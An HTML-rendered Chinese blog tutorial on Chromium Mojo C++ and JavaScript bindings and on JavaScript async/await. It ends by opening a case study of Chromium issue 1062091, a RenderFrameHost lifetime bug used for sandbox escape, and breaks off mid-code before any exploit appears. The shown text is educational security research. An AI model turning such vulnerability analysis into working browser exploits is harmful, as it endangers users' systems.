class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> :</span> <span class="keyword">public</span> Foo &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PassBarReceiver</span><span class="params">(mojo::AssociatedReceiver&lt;Bar&gt; bar)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    bar_receiver_.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  Receiver&lt;Foo&gt; foo_receiver_;</span><br><span class="line">  AssociatedReceiver&lt;Bar&gt; bar_receiver_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这个例子里,bar_receiver_的生命周期和FooImpl息息相关，但是你不必这样做。<br>你可以将bar2传递到另一个序列，然后在那里绑定<code>AssociatedReceiver&lt;Bar&gt;</code>。</p><h5 id="Passing-associated-remotes"><a href="#Passing-associated-remotes" class="headerlink" title="Passing associated remotes"></a>Passing associated remotes</h5><p>同理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">mojo::AssociatedReceiver&lt;Bar&gt; <span class="title">bar_receiver</span><span class="params">(some_bar_impl)</span></span>;</span><br><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">mojo::PendingAssociatedReceiver&lt;Bar&gt; bar_pending_receiver = bar.InitWithNewEndpointAndPassReceiver();</span><br><span class="line">foo-&gt;PassBarRemote(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br><span class="line">bar_receiver.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(bar_pending_receiver));</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">mojo::AssociatedReceiver&lt;Bar&gt; <span class="title">bar_receiver</span><span class="params">(some_bar_impl)</span></span>;</span><br><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">bar_receiver.Bind(bar.InitWithNewPipeAndPassReceiver());</span><br><span class="line">foo-&gt;PassBarRemote(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br></pre></td></tr></table></figure><h3 id="Mojo-JavaScript-Bindings-API"><a href="#Mojo-JavaScript-Bindings-API" class="headerlink" title="Mojo JavaScript Bindings API"></a>Mojo JavaScript Bindings API</h3><h4 id="Getting-Started-1"><a href="#Getting-Started-1" class="headerlink" title="Getting Started"></a>Getting Started</h4><p>bindings API被定义在mojo namespace里，其实现在<a href="https://source.chromium.org/chromium/chromium/src/+/master:out/Debug/gen/mojo/public/js/mojo_bindings.js" target="_blank" rel="noopener">mojo_bindings.js</a><br>当bindings generator处理mojom IDL文件时，将会生成对应的mojom.js文件。<br>假设我们创建一个<code>//services/echo/public/interfaces/echo.mojom</code>文件和<code>//services/echo/public/interfaces/BUILD.gn</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> test.echo.mojom;</span><br><span class="line"></span><br><span class="line">interface Echo &#123;</span><br><span class="line">  EchoInteger(int32 value) =&gt; (int32 result);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">"//mojo/public/tools/bindings/mojom.gni"</span>)</span><br><span class="line"></span><br><span class="line">mojom(<span class="string">"interfaces"</span>) &#123;</span><br><span class="line">  sources = [</span><br><span class="line">    <span class="string">"echo.mojom"</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构建如下生成target，来生成bindings。</p><ul><li>foo_js JavaScript bindings; 被用在compile-time dependency.</li><li>foo_js_data_deps JavaScript bindings; 被用在run-time dependency.</li></ul><p>如果我们编译这个target,这将生成几个source file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out&#x2F;r services&#x2F;echo&#x2F;public&#x2F;interfaces:interfaces_js</span><br></pre></td></tr></table></figure><p>其中与js binding相关的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out&#x2F;gen&#x2F;services&#x2F;echo&#x2F;public&#x2F;interfaces&#x2F;echo.mojom.js</span><br></pre></td></tr></table></figure><p>为了使用echo.mojom中的定义，您将需要使用<code>&lt;script&gt;</code>标签在html页面中包括两个文件：</p><ul><li>mojo_bindings.js: 注意这个文件必须放在所有的<code>.mojom.js</code>文件之前。</li><li>echo.mojom.js<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/echo.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoPtr = <span class="keyword">new</span> test.echo.mojom.EchoPtr();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoRequest = mojo.makeRequest(echoPtr);</span></span><br><span class="line"><span class="actionscript"><span class="comment">// ...</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Interfaces-2"><a href="#Interfaces-2" class="headerlink" title="Interfaces"></a>Interfaces</h4>和C++ bindings API相同的是，我们有</li><li><code>mojo.InterfacePtrInfo</code>和<code>mojo.InterfaceRequest</code>封装message pipe的两端，他们分别代表interface连接的client端和service端</li><li>对于每个Mojom interface Foo，这也生成一个FooPtr类，它保存一个InterfacePtrInfo，提供了使用InterfacePtrInfo中的message pipe handle发送interface call的方法。</li><li><code>mojo.Binding</code>保存一个InterfaceRequest。 它侦听message pipe handle，并将传入的message分发到user-defined的interface实现。</li></ul><p>让我们考虑上面的echo.mojom示例。下面显示了如何创建Echo interface connection和使用它进行call。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/echo.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">EchoImpl</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="actionscript">EchoImpl.prototype.echoInteger = <span class="function"><span class="keyword">function</span><span class="params">(value)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123;<span class="attr">result</span>: value&#125;);</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// Promise.resolve('foo')</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// 粗略可以理解成，但注意这并不严格等价，只是在这里可以这么理解</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// new Promise(resolve =&gt; resolve('foo'))</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServicePtr = <span class="keyword">new</span> test.echo.mojom.EchoPtr();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServiceRequest = mojo.makeRequest(echoServicePtr);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServiceBinding = <span class="keyword">new</span> mojo.Binding(test.echo.mojom.Echo,</span></span><br><span class="line"><span class="actionscript">                                          <span class="keyword">new</span> EchoImpl(),</span></span><br><span class="line">                                          echoServiceRequest);</span><br><span class="line"><span class="actionscript">echoServicePtr.echoInteger(&#123;value: <span class="number">123</span>&#125;).then(<span class="function"><span class="keyword">function</span><span class="params">(response)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">'The result is '</span> + response.result);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Interface-Pointer-and-Request"><a href="#Interface-Pointer-and-Request" class="headerlink" title="Interface Pointer and Request"></a>Interface Pointer and Request</h5><p>在上面的示例中,test.echo.mojom.EchoPtr是一个interface pointer类，它代表interface connection的client。对于Echo Mojom接口中的方法EchoInteger，在EchoPtr中定义了相应的echoInteger方法（注意，生成的method name的格式为camelCaseWithLowerInitial,即小驼峰,第一个字母小写)<br>这就是实际生成的<a href="https://source.chromium.org/chromium/chromium/src/+/master:out/win-Debug/gen/mojo/public/interfaces/bindings/tests/echo.mojom.js" target="_blank" rel="noopener">echo.mojom.js</a><br>在上面的实例中，echoServiceRequest是一个InterfaceRequest实例，它代表接口连接的server。<br>mojo.makeRequest创建一个message pipe，用pipe的一端填充output参数（可以是InterfacePtrInfo或interface pointer）,返回包装在InterfaceRequest实例中的另一端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// |output| could be an interface pointer, InterfacePtrInfo or</span></span><br><span class="line"><span class="comment">// AssociatedInterfacePtrInfo.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRequest</span>(<span class="params">output</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (output <span class="keyword">instanceof</span> mojo.AssociatedInterfacePtrInfo) &#123;</span><br><span class="line">    <span class="keyword">var</span> &#123;handle0, handle1&#125; = internal.createPairPendingAssociation();</span><br><span class="line">    output.interfaceEndpointHandle = handle0;</span><br><span class="line">    output.version = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> mojo.AssociatedInterfaceRequest(handle1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (output <span class="keyword">instanceof</span> mojo.InterfacePtrInfo) &#123;</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    output.handle = pipe.handle0;</span><br><span class="line">    output.version = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> mojo.InterfaceRequest(pipe.handle1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">  output.ptr.bind(<span class="keyword">new</span> mojo.InterfacePtrInfo(pipe.handle0, <span class="number">0</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> mojo.InterfaceRequest(pipe.handle1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Binding-an-InterfaceRequest"><a href="#Binding-an-InterfaceRequest" class="headerlink" title="Binding an InterfaceRequest"></a>Binding an InterfaceRequest</h5><p>mojo.Binding桥接了interface的实现和message pipe的一端，从而将传入的message从server端分派到该实现。<br>在上面的示例中，echoServiceBinding侦听message pipe上的传入的EchoInteger方法调用，并将这些调用分派到EchoImpl实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// |request| could be omitted and passed into bind() later.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    // FooImpl implements mojom.Foo.</span></span><br><span class="line"><span class="comment">//    function FooImpl() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//    FooImpl.prototype.fooMethod1 = function() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//    FooImpl.prototype.fooMethod2 = function() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    var fooPtr = new mojom.FooPtr();</span></span><br><span class="line"><span class="comment">//    var request = makeRequest(fooPtr);</span></span><br><span class="line"><span class="comment">//    var binding = new Binding(mojom.Foo, new FooImpl(), request);</span></span><br><span class="line"><span class="comment">//    fooPtr.fooMethod1();</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Binding</span>(<span class="params">interfaceType, impl, requestOrHandle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.interfaceType_ = interfaceType;</span><br><span class="line">  <span class="keyword">this</span>.impl_ = impl;</span><br><span class="line">  <span class="keyword">this</span>.router_ = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.stub_ = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (requestOrHandle)</span><br><span class="line">    <span class="keyword">this</span>.bind(requestOrHandle);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">  Binding.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">requestOrHandle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.close();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> handle = requestOrHandle <span class="keyword">instanceof</span> mojo.InterfaceRequest ?</span><br><span class="line">      requestOrHandle.handle : requestOrHandle;</span><br><span class="line">  <span class="keyword">if</span> (!(handle <span class="keyword">instanceof</span> MojoHandle))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.router_ = <span class="keyword">new</span> internal.Router(handle);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.stub_ = <span class="keyword">new</span> <span class="keyword">this</span>.interfaceType_.stubClass(<span class="keyword">this</span>.impl_);</span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ = <span class="keyword">new</span> internal.InterfaceEndpointClient(</span><br><span class="line">      <span class="keyword">this</span>.router_.createLocalEndpointHandle(internal.kPrimaryInterfaceId),</span><br><span class="line">      <span class="keyword">this</span>.stub_, <span class="keyword">this</span>.interfaceType_.kVersion);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ .setPayloadValidators([</span><br><span class="line">      <span class="keyword">this</span>.interfaceType_.validateRequest]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="Receiving-Responses-1"><a href="#Receiving-Responses-1" class="headerlink" title="Receiving Responses"></a>Receiving Responses</h5><p>一些mojom接口期待response，例如EchoInteger，对应的js方法返回一个Promise，当service端发回响应时，此Promise将被resolve，如果interface断开连接，则将被reject。</p><h2 id="async和await"><a href="#async和await" class="headerlink" title="async和await"></a>async和await</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolveAfter2Seconds</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      resolve(x);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="keyword">await</span> resolveAfter2Seconds(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(x); <span class="comment">// 10</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"sakura"</span>);</span><br><span class="line">&#125;</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">sakura</span><br><span class="line"><span class="number">10</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>使用<code>new Promise( function(resolve, reject) {...} /* executor */  );</code>来创建一个Promise对象，其参数executor是带有resolve和reject两个参数的函数 。<br>Promise构造函数执行时立即调用executor函数，resolve和reject两个函数作为参数传递给executor（executor函数在Promise构造函数返回所建promise实例对象前被调用）。resolve和reject函数被调用时，分别将promise的状态改为fulfilled（完成）或rejected（失败）。</p><p>如上resolveAfter2Seconds函数返回一个Promise对象，其将立刻调用setTimeout函数，并等待then一个函数，作为它的resolve来执行<br>例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resolveAfter2Seconds(<span class="number">10</span>).then(<span class="function">(<span class="params">x</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(x)&#125;)</span><br><span class="line">...</span><br><span class="line"><span class="comment">//10</span></span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-073550.png" alt=""><br>await可以等待Promise里的executor函数执行结束（<strong>阻塞</strong>），并返回其promise的fulfilled value，其实也就是作为参数传给resolve函数的那个值。<br>另外</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// 粗略可以理解成，但注意这并不严格等价，只是在这里可以这么理解</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">  resolve(<span class="string">'foo'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>所以如果<code>let a = await Promise.resolve(&#39;foo&#39;)</code>，则a的值为’foo’</p><p>await一般和async一起用，如最前面的例子，只有f1函数里的被阻塞，而不影响f2函数执行，关于异步在这里不再多说，知道这些已经足够，另外一般的写法都是用了箭头函数，这里为了更好理解就改掉了。</p><h2 id="case-study-RenderFrameHost-lifetime-cause-sandbox-escape"><a href="#case-study-RenderFrameHost-lifetime-cause-sandbox-escape" class="headerlink" title="case study: RenderFrameHost lifetime cause sandbox escape"></a>case study: RenderFrameHost lifetime cause sandbox escape</h2><p>这里我们通过一个简单的漏洞<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1062091" target="_blank" rel="noopener">issue-1062091</a>来学习chrome的对象生命周期造成的一类安全问题。<br>我们首先看一下造成这个漏洞的mojo接口的定义,在继续往下阅读之前，请仔细的理解前面我写的mojo的基础知识。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Represents a system application related to a particular web app.</span><br><span class="line">&#x2F;&#x2F; See: https:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;appmanifest&#x2F;#dfn-application-object</span><br><span class="line">struct RelatedApplication &#123;</span><br><span class="line">  string platform;</span><br><span class="line">  &#x2F;&#x2F; TODO(mgiuca): Change to url.mojom.Url (requires changing</span><br><span class="line">  &#x2F;&#x2F; WebRelatedApplication as well).</span><br><span class="line">  string? url;</span><br><span class="line">  string? id;</span><br><span class="line">  string? version;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Mojo service for the getInstalledRelatedApps implementation.</span><br><span class="line">&#x2F;&#x2F; The browser process implements this service and receives calls from</span><br><span class="line">&#x2F;&#x2F; renderers to resolve calls to navigator.getInstalledRelatedApps().</span><br><span class="line">interface InstalledAppProvider &#123;</span><br><span class="line">  &#x2F;&#x2F; Filters |relatedApps|, keeping only those which are both installed on the</span><br><span class="line">  &#x2F;&#x2F; user&#39;s system, and related to the web origin of the requesting page.</span><br><span class="line">  &#x2F;&#x2F; Also appends the app version to the filtered apps.</span><br><span class="line">  FilterInstalledApps(array&lt;RelatedApplication&gt; related_apps, url.mojom.Url manifest_url)</span><br><span class="line">      &#x3D;&gt; (array&lt;RelatedApplication&gt; installed_apps);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120341.jpg" alt=""><br>一个render进程里的RenderFrame，对应到browser进程里的一个RenderFrameHost。<br>打开一个新的tab，或者创建一个iframe的时候，都对应创建出一个新的RenderFrameHost对象，而在构造一个新的RenderFrameHost对象的时候，会使用RenderFrameHostImpl来初始化一个BrowserInterfaceBrokerImpl对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//content/browser/renderer_host/render_frame_host_impl.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">RenderFrameHostImpl</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> RenderFrameHost,</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">// BrowserInterfaceBroker implementation through which this</span></span><br><span class="line">  <span class="comment">// RenderFrameHostImpl exposes document-scoped Mojo services to the currently</span></span><br><span class="line">  <span class="comment">// active document in the corresponding RenderFrame.</span></span><br><span class="line">  BrowserInterfaceBrokerImpl&lt;RenderFrameHostImpl, RenderFrameHost*&gt; broker_&#123;</span><br><span class="line">      <span class="keyword">this</span>&#125;;</span><br></pre></td></tr></table></figure><p>broker可以用来在render和browser之间通信，其bind来自renderer的interfaces requested到具体的mojo interface impl上，依据不同的ExecutionContextHost，最终调用的PopulateBinderMap不同，这里是使用的renderframehost，关于其他host，以后再深究。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// content's implementation of the BrowserInterfaceBroker interface that binds</span></span><br><span class="line"><span class="comment">// interfaces requested by the renderer. Every execution context type (frame,</span></span><br><span class="line"><span class="comment">// worker etc) owns an instance and registers appropriate handlers (see</span></span><br><span class="line"><span class="comment">// internal::PopulateBinderMap).</span></span><br><span class="line"><span class="comment">// Note: this mechanism will eventually replace the usage of InterfaceProvider</span></span><br><span class="line"><span class="comment">// and browser manifests, as well as DocumentInterfaceBroker.</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> ExecutionContextHost, <span class="keyword">typename</span> InterfaceBinderContext&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BrowserInterfaceBrokerImpl</span> :</span> <span class="keyword">public</span> <span class="built_in">blink</span>::mojom::BrowserInterfaceBroker &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  BrowserInterfaceBrokerImpl(ExecutionContextHost* host) : host_(host) &#123;</span><br><span class="line">    internal::PopulateBinderMap(host, &amp;binder_map_);</span><br><span class="line">    internal::PopulateBinderMapWithContext(host, &amp;binder_map_with_context_);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120828.png" alt=""><br>通过<code>map-&gt;Add</code>来向broker里注册适当的handlers回调，由于RenderFrameHostImpl里保存一个BrowserInterfaceBroker的实例，所以当此实现收到来自render的GetInterface方法调用时，它将调用这个回调，例如当通过bindinterface来请求调用一个interface的时候，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host,</span></span></span><br><span class="line"><span class="function"><span class="params">                          service_manager::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">map</span>-&gt;Add&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt;(</span><br><span class="line">      base::BindRepeating(&amp;RenderFrameHostImpl::CreateInstalledAppProvider,</span><br><span class="line">                          base::Unretained(host)));</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看一下mojo接口的定义<br>所以最终从mojo调到的注册函数如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 